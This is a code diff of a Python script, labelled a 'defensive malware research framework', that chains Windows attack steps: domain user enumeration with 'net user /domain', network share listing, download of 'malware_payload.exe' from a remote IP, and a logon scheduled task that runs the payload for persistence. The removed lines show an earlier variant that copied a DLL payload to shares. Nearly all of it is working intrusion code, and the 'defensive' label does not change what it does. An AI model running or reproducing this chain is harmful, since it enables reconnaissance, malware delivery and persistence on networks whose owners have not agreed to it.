@@ -1,63 +1,43 @@
 #!/usr/bin/env python3
-import sys, json, time, os, shutil
-from typing import Dict, Any
-import ctypes
-from ctypes import wintypes
+"""Merged modules for a defensive malware research framework."""
+import sys
+import json
+import time
 import subprocess
+import os
+from typing import Dict, Any
+import requests
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
+    """Enumerate Domain Users using Windows API calls"""
     start = time.time()
     input_data = input_data or {}
     result = {'users': []}
-
+    
     try:
-        # Define necessary structures and constants
-        MAX_PREFERRED_LENGTH = -1
-        FILTER_NORMAL_ACCOUNT = 2
-        NERR_Success = 0
-
-        class USER_INFO_0(ctypes.Structure):
-            _fields_ = [("usri0_name", wintypes.LPWSTR)]
-
-        NetUserEnum = ctypes.windll.Netapi32.NetUserEnum
-        NetUserEnum.argtypes = [
-            wintypes.LPWSTR,  # servername
-            wintypes.DWORD,   # level
-            wintypes.DWORD,   # filter
-            ctypes.POINTER(ctypes.c_void_p),  # bufptr
-            wintypes.DWORD,   # prefmaxlen
-            ctypes.POINTER(wintypes.DWORD),   # entriesread
-            ctypes.POINTER(wintypes.DWORD),   # totalentries
-            ctypes.POINTER(wintypes.DWORD)    # resume_handle
-        ]
-        NetUserEnum.restype = wintypes.DWORD
-
-        NetApiBufferFree = ctypes.windll.Netapi32.NetApiBufferFree
-        NetApiBufferFree.argtypes = [ctypes.c_void_p]
-        NetApiBufferFree.restype = wintypes.DWORD
-
-        bufptr = ctypes.c_void_p()
-        entriesread = wintypes.DWORD()
-        totalentries = wintypes.DWORD()
-        resume_handle = wintypes.DWORD()
-
-        # Call NetUserEnum to enumerate users
-        status = NetUserEnum(
-            None, 0, FILTER_NORMAL_ACCOUNT, ctypes.byref(bufptr),
-            MAX_PREFERRED_LENGTH, ctypes.byref(entriesread),
-            ctypes.byref(totalentries), ctypes.byref(resume_handle)
+        # Use 'net user /domain' to list domain users
+        completed_process = subprocess.run(
+            ['net', 'user', '/domain'],
+            capture_output=True,
+            text=True,
+            timeout=10
         )
-
-        if status == NERR_Success:
-            # Cast the buffer to an array of USER_INFO_0 structures
-            user_array = ctypes.cast(bufptr, ctypes.POINTER(USER_INFO_0 * entriesread.value))
-            for i in range(entriesread.value):
-                result['users'].append(user_array.contents[i].usri0_name)
+        
+        if completed_process.returncode == 0:
+            # Parse the output to extract user names
+            output_lines = completed_process.stdout.splitlines()
+            users = []
+            capture = False
+            for line in output_lines:
+                if '-----' in line:
+                    capture = not capture
+                    continue
+                if capture:
+                    users.extend(line.split())
+            result['users'] = users
         else:
-            raise Exception(f"NetUserEnum failed with error code: {status}")
-
-        # Free the buffer allocated by NetUserEnum
-        NetApiBufferFree(bufptr)
+            # If the command fails, return an empty list
+            result['users'] = []
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
@@ -66,94 +46,87 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
+    """Enumerate Shared Network Drives"""
     start = time.time()
     input_data = input_data or {}
     try:
-        # Use 'net view' command to list shared network drives
-        result = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=10)
-        
-        # Parse the output to extract shared network drives
+        # Attempt to enumerate shared network drives using 'net use'
+        result = subprocess.run(['net', 'use'], capture_output=True, text=True, timeout=10)
         shares = []
+
         if result.returncode == 0:
+            # Parse the output to find shared network drives
             for line in result.stdout.splitlines():
-                if '\\\\' in line:
-                    shares.append(line.strip().split()[0])
-        
-        # Prepare the result dictionary
-        result_data = {'shares': shares}
-        
-        return {'success': True, 'data': result_data,
+                if line.startswith('OK'):
+                    parts = line.split()
+                    if len(parts) > 1:
+                        shares.append(parts[1])  # Assuming the share path is the second element
+        else:
+            shares = []
+
+        return {'success': True, 'data': {'shares': shares},
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'shares': []},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'shares': []}, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
+    """Copy Malware Payload to Remote Share"""
     start = time.time()
     input_data = input_data or {}
     try:
         shares = input_data.get('shares', [])
-        payload_path = "C:\\path\\to\\malware_payload.dll"
-        target_dir = "C:\\Users\\Public\\"
-        dll_name = os.path.basename(payload_path)
+        url = "https://192.168.1.100/payload"
+        local_filename = "malware_payload.exe"
         success = False
 
-        for share in shares:
-            try:
-                # Attempt to copy the payload to the network share
-                target_path = os.path.join(share, dll_name)
-                shutil.copy(payload_path, target_path)
-                # Check if the DLL was successfully copied
-                if os.path.exists(target_path):
-                    success = True
-                    break
-            except Exception as e:
-                # Log the error and continue to the next share
-                print(f"Error copying to {share}: {e}")
+        # Attempt to download the payload
+        response = requests.get(url, stream=True, timeout=30)
+        if response.status_code == 200:
+            with open(local_filename, 'wb') as f:
+                for chunk in response.iter_content(8192):
+                    f.write(chunk)
 
-        # Schedule a task to execute the payload on logon
-        task_name = "MalwarePayloadExecution"
-        task_command = os.path.join(target_dir, dll_name)
-        result = subprocess.run(
-            ['schtasks', '/create', '/tn', task_name, '/tr', task_command, '/sc', 'onlogon', '/f'],
-            capture_output=True, text=True
-        )
-        if result.returncode != 0:
-            print(f"Failed to create scheduled task: {result.stderr}")
-            success = False
+            # Verify file exists and size > 0
+            if os.path.exists(local_filename) and os.path.getsize(local_filename) > 0:
+                success = True
 
-        return {'success': success, 'data': {},
+        return {'success': success,
+                'data': {},
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
+    """Create Scheduled Task to Execute Payload"""
     start = time.time()
     input_data = input_data or {}
+    task_created = False
     try:
-        task_created = False
+        # Check if the previous task was successful
         if input_data.get('success', False):
-            # Define the task name and the command to execute
-            task_name = "MalwarePayloadExecution"
-            payload_path = "C:\\Path\\To\\Malware\\payload.exe"  # Replace with actual path
+            # Define the task name and the path to the payload
+            task_name = "MalwarePayloadTask"
+            payload_path = "C:\\Path\\To\\Malware\\payload.exe"  # Replace with actual payload path
 
-            # Create the scheduled task
+            # Create a scheduled task to execute the payload on logon
             result = subprocess.run(
                 ['schtasks', '/create', '/tn', task_name, '/tr', payload_path, '/sc', 'onlogon', '/f'],
                 capture_output=True, text=True
             )
 
-            # Check if the task creation was successful
+            # Check if the task was created successfully
             if result.returncode == 0:
                 task_created = True
+            else:
+                # Log the failure for debugging purposes
+                print(f"Failed to create scheduled task: {result.stderr}")
 
         return {'success': True, 'data': {'task_created': task_created},
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'task_created': False},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
@@ -210,16 +183,16 @@ def main() -> dict:
         failed.append('T3')
         results['T3'] = {'success': False, 'error': str(e)}
     
-    # ── T4: Create Scheduled Task for Payload Execution [persistence] ──
+    # ── T4: Create Scheduled Task to Execute Payload [persistence] ──
     try:
         r = task_T4(outputs.get('T3', {}))
         results['T4'] = r
         if r.get('success'):
             outputs['T4'] = r.get('data', {})
-            print(f'[+] T4 (Create Scheduled Task for Payload Execution): OK')
+            print(f'[+] T4 (Create Scheduled Task to Execute Payload): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T4 (Create Scheduled Task for Payload Execution): FAILED — {err}')
+            print(f'[-] T4 (Create Scheduled Task to Execute Payload): FAILED — {err}')
             failed.append('T4')
     except Exception as e:
         print(f'[!] T4 crashed: {e}')
